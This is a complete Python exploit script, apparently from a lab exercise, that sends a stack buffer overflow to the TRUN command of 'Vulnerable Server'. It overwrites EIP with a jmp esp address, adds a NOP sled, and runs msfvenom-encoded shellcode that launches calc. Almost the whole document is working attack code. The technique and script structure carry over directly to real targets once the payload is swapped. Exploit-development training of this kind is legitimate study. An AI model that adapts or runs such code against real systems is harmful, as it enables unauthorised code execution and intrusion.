#!/usr/bin/python

import socket

class ConnectError(Exception):
    pass

def main():

    target_ip = "192.168.255.129"
    target_port = 9999
    cmd = "TRUN "
    nops = "\x90" * 50
    # jmp esp found at 0x625011af in essfunc.dll
    eip = "\xaf\x11\x50\x62"
    expected_prompt = "Welcome to Vulnerable Server! Enter HELP for help."

    # check to see if the server is up, exit if it isn't responding with the prompt
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        prompt = s.recv(2048)
        if expected_prompt not in prompt:
            raise ConnectError
    except ConnectError:
        print "Something is wrong with the program, check it."
        exit(1)

    # bad characters: \x00
    # msfvenom -p windows/exec CMD="calc" -f python -b "\x00" --encoder x86/shikata_ga_nai
    buf =  ""
    buf += "\xbe\xcf\x3a\xe0\xab\xdb\xd7\xd9\x74\x24\xf4\x5a\x2b"
    buf += "\xc9\xb1\x30\x31\x72\x13\x83\xc2\x04\x03\x72\xc0\xd8"
    buf += "\x15\x57\x36\x9e\xd6\xa8\xc6\xff\x5f\x4d\xf7\x3f\x3b"
    buf += "\x05\xa7\x8f\x4f\x4b\x4b\x7b\x1d\x78\xd8\x09\x8a\x8f"
    buf += "\x69\xa7\xec\xbe\x6a\x94\xcd\xa1\xe8\xe7\x01\x02\xd1"
    buf += "\x27\x54\x43\x16\x55\x95\x11\xcf\x11\x08\x86\x64\x6f"
    buf += "\x91\x2d\x36\x61\x91\xd2\x8e\x80\xb0\x44\x85\xda\x12"
    buf += "\x66\x4a\x57\x1b\x70\x8f\x52\xd5\x0b\x7b\x28\xe4\xdd"
    buf += "\xb2\xd1\x4b\x20\x7b\x20\x95\x64\xbb\xdb\xe0\x9c\xb8"
    buf += "\x66\xf3\x5a\xc3\xbc\x76\x79\x63\x36\x20\xa5\x92\x9b"
    buf += "\xb7\x2e\x98\x50\xb3\x69\xbc\x67\x10\x02\xb8\xec\x97"
    buf += "\xc5\x49\xb6\xb3\xc1\x12\x6c\xdd\x50\xfe\xc3\xe2\x83"
    buf += "\xa1\xbc\x46\xcf\x4f\xa8\xfa\x92\x05\x2f\x88\xa8\x6b"
    buf += "\x2f\x92\xb2\xdb\x58\xa3\x39\xb4\x1f\x3c\xe8\xf1\xd0"
    buf += "\x76\xb1\x53\x79\xdf\x23\xe6\xe4\xe0\x99\x24\x11\x63"
    buf += "\x28\xd4\xe6\x7b\x59\xd1\xa3\x3b\xb1\xab\xbc\xa9\xb5"
    buf += "\x18\xbc\xfb\xd5\xff\x2e\x67\x1a"

    # offset string: "TRUN /.:/" + 2003 characters
    string = cmd + "/.:/" + "A" * 2003 + eip + nops + buf + "\x00"
    
    s.send(string)

if __name__ == '__main__':
    main()
